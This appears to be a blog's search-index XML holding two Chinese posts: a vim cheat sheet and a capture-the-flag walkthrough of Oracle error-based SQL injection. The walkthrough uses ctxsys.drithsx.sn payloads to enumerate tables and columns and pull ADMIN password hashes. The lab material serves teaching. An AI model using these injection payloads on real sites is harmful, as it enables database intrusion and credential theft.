<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>vim终端编辑器</title>
    <url>/2021/09/02/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
    <content><![CDATA[<h2 id="介绍：vim是vi的扩展，被誉为终端编辑器神器"><a href="#介绍：vim是vi的扩展，被誉为终端编辑器神器" class="headerlink" title="介绍：vim是vi的扩展，被誉为终端编辑器神器"></a>介绍：vim是vi的扩展，被誉为终端编辑器神器</h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><code>yum install -y vim</code></p>
<h4 id="工作模式：正常模式，插入模式，编辑模式"><a href="#工作模式：正常模式，插入模式，编辑模式" class="headerlink" title="工作模式：正常模式，插入模式，编辑模式"></a>工作模式：正常模式，插入模式，编辑模式</h4><h4 id="正常模式：使用vim打开文件时的默认模式"><a href="#正常模式：使用vim打开文件时的默认模式" class="headerlink" title="正常模式：使用vim打开文件时的默认模式"></a>正常模式：使用vim打开文件时的默认模式</h4><p>vim filename    打开文件，若文件不存在就新建文件<br>esc：切换到正常模式<br>shift + zz ：保存退出<br>vim filename  +n： 打开文件，定位到第n行<br>vim filename  +： 打开文件，定位到末尾<br>gg：        定位到首行<br>G：        定位到尾行<br>ngg：    定位到第n行<br>^：        定位到行首<br>$：        定位到行尾<br>yy：        复制光标所在行<br>p：        粘贴<br>nyy：    复制光标开始的n行<br>dd：        删除光标所在行<br>ndd：    删除光标开始的n行<br>u：        撤销操作<br>ctrl + r:    反撤销操作</p>
<h4 id="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："><a href="#插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：" class="headerlink" title="插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入："></a>插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：</h4><p>i：在光标处输入<br>I：在行首插入<br>a：在光标下一个字符处插入<br>A：在行位插入<br>o：在光标下一行插入一行空行<br>O：在光标上一行插入一行空行<br>s：删除光标所在字符并插入<br>S：删除光标所在行并插入</p>
<h4 id="编辑模式：是对整个文件进行的操作，如：保存、退出"><a href="#编辑模式：是对整个文件进行的操作，如：保存、退出" class="headerlink" title="编辑模式：是对整个文件进行的操作，如：保存、退出"></a>编辑模式：是对整个文件进行的操作，如：保存、退出</h4><p>：w        保存<br>：q        退出<br>：q！    强制退出<br>：wq        保存退出，等价于shift+zz<br>：x        保存退出，等价于wq<br>：set nu    显示行号<br>：set nonu    隐藏行号<br>：行号    定位到指定行号<br>/内容        查找指定内容，n下翻，N上翻<br>：%s/原内容/新内容        使用新内容替换原内容，全部替换<br>：m,ns/原内容/新内容    使用新内容替换原内容，替换m行到n行</p>
<p>友情提示：若非正常关闭vim，则会生成临时文件（隐藏的），需要删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/09/02/oracle%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="oracle注入原理："><a href="#oracle注入原理：" class="headerlink" title="oracle注入原理："></a>oracle注入原理：</h4><p>同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，Oracle数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据<code>CTXSYS.DRITHSX.SN(user,())</code></p>
<h4 id="oracle-基本的语法："><a href="#oracle-基本的语法：" class="headerlink" title="oracle 基本的语法："></a>oracle 基本的语法：</h4><p><code>select from all_tables</code> 查询出所有的表</p>
<p><code>select from user_tables</code> 查询出当前用户的表</p>
<p><code>select from all_tab_columns</code> 查询出所有的字段</p>
<p><code>select from user_tab_columns</code> 查询出当前用户的字段</p>
<p><code>select * from v$version</code> 查版本</p>
<p>mssql系统默认库、表 <code>sysobjects</code>、<code>syscolumns</code> 、<code>sysdatabases</code></p>
<p>sql系统默认库、表 <code>information_schema.tables</code> 、<code>information_schema.columns</code></p>
<p>oracel 系统默认库、表 <code>user_table dual</code><br>Dual是一个实表（也有人说它是虚表），如果你直接查询它，它只显示一个X，列名为DUMMY</p>
<h4 id="dual-虚表"><a href="#dual-虚表" class="headerlink" title="dual 虚表"></a>dual 虚表</h4><p>因为语法要求在查询时一定要加表名<br>例如：<br><code>select 1,2,3,4,5 from dual</code>这样就不会报错，用于把语法补全<br>oracle弱化了库的概念，一个用户可以简单理解为一个库</p>
<h4 id="本节难点："><a href="#本节难点：" class="headerlink" title="本节难点："></a>本节难点：</h4><p>如何实现limit 功能？<br>oracle 中利用<code>rownum=1</code>可以取一行数据</p>
<p>当<code>rownum&lt;3</code>可以取两条</p>
<p>当 <code>rownum&lt;5</code>可以取四条<br>rownum 的值会根据查询结果进行改变<br>语句如下可以完成limit功能<br><code>select username from(select rownum r, username from all users) where r=1</code><br>子查询返回一个结果集，结果集也可以看作是一个表，其中‘r’表示一个别名，在这一句中就是rownum的别名</p>
<p>进入靶场<br>发现id传参，and -1=-1，网页显示正常<br><img src="oracle%E6%B3%A8%E5%85%A5/13398c9f9c75acc8db4a5f68bb46e9c1_53001.png" alt="img"><br><code>and -1=-2</code> 报错，表示与数据库有交互</p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/c6c62105424b89e131a3d08009be0283_52255.png" alt="img"><br>查字段，<br><code>order by 4</code> 显示正常</p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/a746c735dd773a3fc0faf2d0eb3124bf_99263.png" alt="img"><br><code>order by 5</code> 报错，有4个字段</p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/9f4c1acb2e3f0f1257fb2658f3c49251_65115.png" alt="img"><br>联合查询,因为oracle数据库对数据类型要求很严格，所以使用语句<br><code>union all select null,null,null,null from dual</code> </p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/39595671a79ff399660c5d761a33b172_13192.png" alt="img"><br>下面使用报错注入方法</p>
<h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>可以不考虑类型</p>
<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>在数据库中对查询相应的关键词，然后查询失败，爆出数据</p>
<h4 id="函数：ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1"><a href="#函数：ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1" class="headerlink" title="函数：ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))"></a>函数：<code>ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))</code></h4><p>这个函数就是一个查询，而子查询优先进行，所以当查询函数查不到的时候，就会报错，但是我们真正要的数据在子查询里已经查过了，通过报错显示出来<br>查表名<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/d2ae5775f40430aa093368d9de59b717_36455.png" alt="img"><br>得到表名NEWS<br>查其他表<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&#39;NEWS&#39;))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/fcee90e1064edd517404a1b0e73afffe_63858.png" alt="img"><br>得到ADMIN表<br>查字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&#39;ADMIN&#39; and rownum=1))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/6f6cb5b762df582023711d1f14d25ced_45103.png" alt="img"><br>得到ID 字段<br>查其他字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39;))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/aa4ebd000b87d48f359012e29effff11_55992.png" alt="img"><br>得到字段UNAME<br>再查其他字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39; and  column_name&lt;&gt;&#39;UNAME&#39;))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/19b6910c78b7b2257e6e1f4b458f655b_33826.png" alt="img"><br>得到字段UPASS<br>查内容<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 ))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/a5d5e71b3e8d5198db52fcf3dd845256_96867.png" alt="img"><br>得到数据：<code>f583aea84b6ded258f529205eb6d56a7</code><br>继续查其他数据<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39;))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/8a2aec5704d8a8e2c0e0096b3c60436c_68528.png" alt="img"><br>试过发现这个也不是flag，继续<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39; and UPASS &lt;&gt;  &#39;9e8e7f6953dd11ceccc6ce655e03e070&#39;))</code></p>
<p><img src="oracle%E6%B3%A8%E5%85%A5/ee47398cb754e2a2f20c0b42b32d58d8_55101.png" alt="img"><br>得到flag：<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>输入通关</p>
]]></content>
  </entry>
</search>
